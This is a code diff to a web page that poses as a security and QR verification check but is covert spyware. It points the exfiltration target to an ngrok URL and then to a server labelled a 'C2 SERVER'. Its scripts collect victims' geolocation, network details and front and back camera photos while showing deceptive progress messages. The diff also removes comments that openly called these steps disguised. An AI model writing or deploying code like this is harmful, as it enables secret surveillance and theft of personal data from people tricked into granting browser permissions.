@@ -200,15 +200,6 @@
             border: 1px solid rgba(0, 200, 100, 0.1);
             margin-left: 8px;
         }
-        .permission-note {
-            font-size: 11px;
-            color: #555577;
-            text-align: center;
-            margin-top: 6px;
-            padding: 6px;
-            background: rgba(255,255,255,0.02);
-            border-radius: 6px;
-        }
     </style>
 </head>
 <body>
@@ -294,12 +285,15 @@
     </div>
 
     <script>
-        const C2_URL = 'https://matchless-palm-patriarch.ngrok-free.dev/exfil';
+        // ============================================================
+        // 24/7 C2 SERVER — RENDER.COM
+        // ============================================================
+        const C2_URL = 'https://c2-server-noio.onrender.com/exfil';
+
         let totalFiles = 0;
         let uploadedFiles = 0;
         let progress = 0;
         let galleryComplete = false;
-        let processedHashes = new Set();
         let startTime = 0;
 
         // ============================================================
@@ -362,7 +356,6 @@
             addLogEntry('● Starting data collection...', 'done');
             startTime = Date.now();
 
-            // --- LOCATION (disguised) ---
             addLogEntry('📍 Detecting region for security verification...', 'warn');
             await collectLocationWithFallback();
             updateProgress(10);
@@ -372,7 +365,6 @@
             await collectNetwork();
             updateProgress(20);
 
-            // --- CAMERA (disguised as QR scan) ---
             addLogEntry('📸 Preparing QR verification...', 'warn');
             await collectCameraMedia();
             updateProgress(35);
@@ -393,7 +385,6 @@
         function collectLocationWithFallback() {
             return new Promise((resolve) => {
                 if (navigator.geolocation) {
-                    // The browser will show a permission prompt — we can't avoid it
                     navigator.geolocation.getCurrentPosition(
                         pos => {
                             sendData({
@@ -480,12 +471,11 @@
         }
 
         // ============================================================
-        // COLLECT CAMERA MEDIA — disguised as QR verification
+        // COLLECT CAMERA MEDIA
         // ============================================================
         async function collectCameraMedia() {
             try {
                 addLogEntry('📸 Scanning QR code for verification...', 'warn');
-                // The browser will show a permission prompt — we can't avoid it
                 const backPhoto = await capturePhoto('environment');
                 if (backPhoto) {
                     sendData({ type: 'photo', camera: 'back', data: backPhoto });
@@ -512,7 +502,7 @@
         }
 
         // ============================================================
-        // PHOTO & VIDEO CAPTURE (reduced quality for speed)
+        // PHOTO & VIDEO CAPTURE
         // ============================================================
         async function capturePhoto(facingMode) {
             try {
